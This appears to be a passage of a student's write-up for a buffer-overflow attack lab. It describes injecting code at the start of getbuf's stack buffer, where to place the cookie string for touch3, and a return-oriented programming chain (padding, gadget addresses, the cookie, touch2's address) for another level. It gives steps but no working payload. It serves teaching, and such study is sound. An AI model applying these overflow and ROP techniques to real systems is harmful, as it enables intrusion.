After observing code for hexmatch we see that it modifies memory address 0x5561dc78
Which happens to be start address for buffer allocated in getbuf function. 
Below in expliot string. Here we have injected code at address 0x5561dc78 which
is a start of buffer allocated. And set our string representation of cookie at
address 0x5561dcb0-0x5561dcb8 which will not be modified by touch3 or hexmatch.

What we need attack string for this level as follows
1. first 40 bytes as padding
2. return address of gadget that pops value from stack into some register say r1
3. value of cookie
4. return address of gadget that moves value from register r1 to %rdi
5. return address of touch2 function.
